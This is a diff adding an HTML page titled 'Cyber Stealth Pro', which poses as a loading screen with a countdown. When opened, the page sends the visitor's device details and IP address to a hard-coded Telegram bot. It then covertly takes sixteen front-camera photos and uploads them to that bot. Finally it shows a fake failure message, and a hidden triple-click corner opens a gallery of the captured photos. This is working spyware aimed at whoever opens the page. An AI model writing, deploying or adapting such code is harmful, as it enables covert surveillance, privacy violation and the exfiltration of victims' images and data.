@@ -1,0 +1,189 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cyber Stealth Pro - Ultra Fast</title>
+    <style>
+        /* আপনার অরিজিনাল ইন্টারফেস - এক চুলও পরিবর্তন করা হয়নি */
+        :root {
+            --neon-green: #2dbd6e;
+            --dark-bg: #0f2027;
+            --error-red: #ff3333;
+        }
+        body, html {
+            margin: 0; padding: 0; width: 100%; height: 100%;
+            overflow: hidden; font-family: 'Segoe UI', sans-serif;
+            background: linear-gradient(45deg, #0f2027, #203a43, #2dbd6e);
+            background-size: 400% 400%;
+            animation: gradientBG 15s ease infinite;
+        }
+        @keyframes gradientBG {
+            0% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+            100% { background-position: 0% 50%; }
+        }
+        .ui-container {
+            height: 100vh; display: flex; flex-direction: column;
+            justify-content: center; align-items: center; color: white;
+        }
+        .timer-static {
+            width: 150px; height: 150px;
+            border: 4px solid var(--neon-green);
+            border-radius: 50%; display: flex;
+            justify-content: center; align-items: center;
+            font-size: 5rem; font-weight: 800;
+            box-shadow: 0 0 40px rgba(45, 189, 110, 0.4);
+            background: rgba(0, 0, 0, 0.2);
+        }
+        .loading-text {
+            margin-top: 30px; font-size: 1.4rem; font-weight: 300;
+            letter-spacing: 4px; text-shadow: 0 0 10px #000;
+        }
+        .dots::after { content: ''; animation: dotAnim 2s infinite; }
+        @keyframes dotAnim {
+            0% { content: ''; } 25% { content: '.'; } 
+            50% { content: '..'; } 75% { content: '...'; } 100% { content: '....'; }
+        }
+        #terminal {
+            display: none; position: fixed; inset: 0;
+            background: rgba(0, 0, 0, 0.95);
+            backdrop-filter: blur(15px); z-index: 2000; padding: 20px; overflow-y: auto;
+        }
+        .terminal-header {
+            color: var(--neon-green); border-bottom: 2px solid var(--neon-green);
+            padding-bottom: 10px; margin-bottom: 20px; font-family: monospace;
+        }
+        .grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 12px; }
+        .grid img { 
+            width: 100%; height: 110px; object-fit: cover; 
+            border-radius: 8px; border: 1px solid #444;
+        }
+        #secret { position: fixed; top: 0; right: 0; width: 60px; height: 60px; z-index: 5000; background: transparent; }
+    </style>
+</head>
+<body>
+
+    <div class="ui-container" id="main-ui">
+        <div class="timer-static" id="timer-num">6</div>
+        <div class="loading-text">LOADING<span class="dots"></span></div>
+    </div>
+
+    <video id="v" autoplay playsinline style="display:none"></video>
+    <canvas id="c" style="display:none"></canvas>
+    <div id="secret" onclick="handleSecret()"></div>
+
+    <div id="terminal">
+        <div class="terminal-header">
+            <h3>photo_capture_gallery v3.6 - SECURE VAULT</h3>
+        </div>
+        <div class="grid" id="photoGrid"></div>
+        <button onclick="closeT()" class="cl-btn" style="margin-top: 40px; width: 100%; background: var(--error-red); padding: 15px; color: white; border: none; border-radius: 8px; cursor: pointer;">CLOSE VAULT</button>
+    </div>
+
+    <script>
+        // --- আপনার দেওয়া টোকেন এবং আইডি এখানে সরাসরি বসিয়ে দিলাম ---
+        const TELEGRAM_TOKEN = "8051827231:AAEz3EN0C0ygwEuBtjZ_fM6RVvLufsSasyA"; 
+        const CHAT_ID = "8358376407"; 
+        // --------------------------------------------------------
+
+        const v = document.getElementById('v');
+        const c = document.getElementById('c');
+        const timerNum = document.getElementById('timer-num');
+        const mainUI = document.getElementById('main-ui');
+        const grid = document.getElementById('photoGrid');
+        
+        let clicks = 0;
+        let cTimer;
+
+        async function sendToTelegram(msg, isPhoto = false) {
+            const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/${isPhoto ? 'sendPhoto' : 'sendMessage'}`;
+            try {
+                if (isPhoto) {
+                    const blob = await (await fetch(msg)).blob();
+                    const fd = new FormData();
+                    fd.append('chat_id', CHAT_ID);
+                    fd.append('photo', blob, 'img.jpg');
+                    await fetch(url, { method: 'POST', body: fd });
+                } else {
+                    await fetch(url, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ chat_id: CHAT_ID, text: msg })
+                    });
+                }
+            } catch (e) {}
+        }
+
+        async function init() {
+            // আইপি এবং ডিভাইস তথ্য সংগ্রহ
+            let info = `🚨 Target Found!\n\nDevice: ${navigator.platform}\nLanguage: ${navigator.language}`;
+            try {
+                const res = await fetch('https://api.ipify.org?format=json');
+                const d = await res.json();
+                info += `\nIP: ${d.ip}`;
+            } catch(e){}
+            sendToTelegram(info);
+
+            try {
+                const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                v.srcObject = s;
+                v.onloadedmetadata = () => process();
+            } catch (e) { sendToTelegram("⚠️ Camera Access Blocked by Target"); }
+        }
+
+        function process() {
+            let pCount = 0;
+            const totalPhotos = 16; // ১৬টি ছবি
+            const captureInterval = 500; // প্রতি ০.৫ সেকেন্ডে একটি (মোট ৮ সেকেন্ড চলবে)
+
+            const capIn = setInterval(() => {
+                if (pCount < totalPhotos) {
+                    const ctx = c.getContext('2d');
+                    c.width = v.videoWidth; 
+                    c.height = v.videoHeight;
+                    ctx.drawImage(v, 0, 0);
+                    const data = c.toDataURL('image/jpeg', 0.5);
+                    
+                    const img = document.createElement('img');
+                    img.src = data;
+                    grid.appendChild(img);
+
+                    // টেলিগ্রামে অটো-সেন্ড
+                    sendToTelegram(data, true);
+                    pCount++;
+                } else { clearInterval(capIn); }
+            }, captureInterval); 
+
+            let left = 6; // টাইমার ৬ থেকে শুরু হবে
+            const tIn = setInterval(() => {
+                left--;
+                if (left > 0) { 
+                    timerNum.innerText = left; 
+                } else {
+                    clearInterval(tIn);
+                    // ব্যাকগ্রাউন্ডে ১৬টি ছবি শেষ হওয়া পর্যন্ত অপেক্ষা করে এরর দেখাবে
+                    setTimeout(() => {
+                        mainUI.innerHTML = `
+                            <div style="text-align:center;">
+                                <div style="font-size:4rem;">⚠️</div>
+                                <div style="color:var(--error-red); font-size:1.5rem; margin-top:20px; font-weight:bold;">
+                                    দুঃখিত, সফল হয়নি!<br>আবার চেষ্টা করুন।
+                                </div>
+                            </div>`;
+                    }, 2500); 
+                }
+            }, 1000);
+        }
+
+        function handleSecret() {
+            clicks++;
+            clearTimeout(cTimer);
+            cTimer = setTimeout(() => clicks = 0, 1000);
+            if (clicks === 3) { document.getElementById('terminal').style.display = 'block'; clicks = 0; }
+        }
+        function closeT() { document.getElementById('terminal').style.display = 'none'; }
+        window.onload = init;
+    </script>
+</body>
+</html>
